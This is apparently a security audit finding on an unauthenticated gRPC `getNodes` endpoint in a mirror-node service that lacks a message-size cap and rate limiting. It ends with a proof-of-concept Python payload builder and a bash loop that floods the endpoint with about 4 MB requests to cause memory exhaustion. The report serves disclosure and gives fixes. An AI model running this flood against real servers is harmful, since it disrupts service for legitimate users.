### Title
Unauthenticated gRPC `getNodes` Endpoint Accepts Oversized Requests with No Rate Limiting, Enabling Memory-Exhaustion DoS

### Summary
The `getNodes` RPC in `NetworkController.java` accepts `AddressBookQuery` messages from any unauthenticated caller with no explicit inbound message size limit configured at the application level, relying solely on gRPC-Java's 4 MB default. The legitimate `AddressBookQuery` payload is at most ~35 bytes (two small fields), yet the server will deserialize up to 4 MB of attacker-controlled protobuf bytes per call before any application-level validation runs. Combined with the absence of connection-count limits or rate limiting, an attacker can open many connections and flood the server with concurrent oversized messages, causing sustained heap pressure and potential service disruption.

### Finding Description

**Proto definition** — `AddressBookQuery` contains only two fields:
- `file_id` (FileID: three int64 values ≈ 30 bytes)
- `limit` (int32 ≈ 5 bytes)

Maximum legitimate wire size: ~35 bytes.

**Server configuration** — `GrpcConfiguration.java` registers a `ServerBuilderCustomizer<NettyServerBuilder>` that sets only two options:

```java
serverBuilder.executor(applicationTaskExecutor);
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection()); // default 5
```

`maxInboundMessageSize` is never called. gRPC-Java therefore falls back to its built-in default of **4,194,304 bytes (4 MB)** per message. No Spring gRPC YAML property overrides this (no `application.yml` exists in `grpc/src/main/resources/`).

**Controller entry point** — `getNodes` immediately deserializes the full incoming message into an `AddressBookQuery` object and passes it to `toFilter()`:

```java
public void getNodes(final AddressBookQuery request, final StreamObserver<NodeAddress> responseObserver) {
    final var disposable = Mono.fromCallable(() -> toFilter(request))   // validation here, post-deserialization
        ...
```

Protobuf deserialization (and its heap allocation) is performed by the gRPC framework before `getNodes` is even invoked. Application-level checks (`fileId` validity, `limit ≥ 0`) run only inside `toFilter()` / `NetworkService.getNodes()`, which is too late.

**No rate limiting or authentication** — a search across all `grpc/src/main/java/**` finds no `RateLimiter`, no authentication interceptor, and no connection-count cap. `maxConcurrentCallsPerConnection = 5` limits concurrency per TCP connection but imposes no bound on the number of simultaneous connections.

**Exploit flow:**
1. Attacker opens *N* TCP connections to port 5600 (plaintext, no auth).
2. On each connection, sends 5 concurrent `getNodes` calls carrying crafted protobuf payloads padded to ~4 MB using unknown/repeated fields (proto3 preserves unknown fields during deserialization).
3. gRPC-Java deserializes each message, allocating up to 4 MB on the heap per call.
4. Peak heap pressure: N × 5 × 4 MB = **20N MB** before any application code runs.
5. Application-level validation eventually rejects the malformed `file_id`, but the memory has already been allocated and GC pressure accumulates across the flood.

### Impact Explanation
Sustained heap exhaustion can trigger frequent GC pauses, degrade response latency for legitimate clients, or cause an `OutOfMemoryError` that crashes the JVM process. Because the gRPC port (5600) is publicly exposed with no authentication, the entire mirror-node gRPC service — including `subscribeTopic` for HCS — becomes unavailable. The 4 MB cap prevents a single-packet OOM but does not prevent a volumetric flood from many connections.

### Likelihood Explanation
No privileges are required. The endpoint is documented and publicly reachable (`grpcurl -plaintext ...`). Crafting a padded protobuf binary is trivial (append a large unknown field blob). The attack is repeatable and scriptable with standard tooling (grpcurl, ghz, custom client). The only friction is network bandwidth to sustain the flood.

### Recommendation
1. **Set an explicit, tight `maxInboundMessageSize`** in `GrpcConfiguration.java`:
   ```java
   serverBuilder.maxInboundMessageSize(1024); // 1 KB is generous for AddressBookQuery
   ```
2. **Add a connection-count limit** via `NettyServerBuilder.maxConnectionAge` / `maxConnectionIdle` and a total-connection cap.
3. **Implement rate limiting** (e.g., a gRPC `ServerInterceptor` using Resilience4j or Bucket4j) keyed on client IP before deserialization.
4. **Deploy an API gateway or load balancer** (e.g., Envoy) in front of the gRPC port to enforce per-IP request rates and payload size limits at the network edge.

### Proof of Concept

```bash
# 1. Build a ~4 MB AddressBookQuery with a large unknown field (field 15, wire type 2 = length-delimited)
python3 -c "
import struct, sys
# field 15, wire type 2 (length-delimited) = (15 << 3) | 2 = 122
tag = b'\x7a'
payload = b'A' * 4_000_000
length = len(payload).to_bytes(4, 'little')  # varint encoding simplified
sys.stdout.buffer.write(tag + bytes([len(payload) & 0x7f | 0x80,
    (len(payload) >> 7) & 0x7f | 0x80,
    (len(payload) >> 14) & 0x7f | 0x80,
    (len(payload) >> 21) & 0x7f]) + payload)
" > big_query.bin

# 2. Flood with 50 parallel connections, 5 concurrent calls each
for i in $(seq 1 50); do
  grpcurl -plaintext -d @ localhost:5600 \
    com.hedera.mirror.api.proto.NetworkService/getNodes < big_query.bin &
done
wait

# 3. Observe JVM heap via JMX/actuator metrics — heap usage spikes before any INVALID_ARGUMENT response
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L27-35)
```java
    @Bean
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/NetworkController.java (L33-43)
```java
    public void getNodes(final AddressBookQuery request, final StreamObserver<NodeAddress> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(networkService::getNodes)
                .map(this::toNodeAddress)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L11-15)
```java
public class NettyProperties {

    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```

**File:** protobuf/src/main/proto/com/hedera/mirror/api/proto/network_service.proto (L15-18)
```text
message AddressBookQuery {
  .proto.FileID file_id = 1; // The ID of the address book file on the network. Can be either 0.0.101 or 0.0.102.
  int32 limit = 2; // The maximum number of node addresses to receive before stopping. If not set or set to zero it will return all node addresses in the database.
}
```
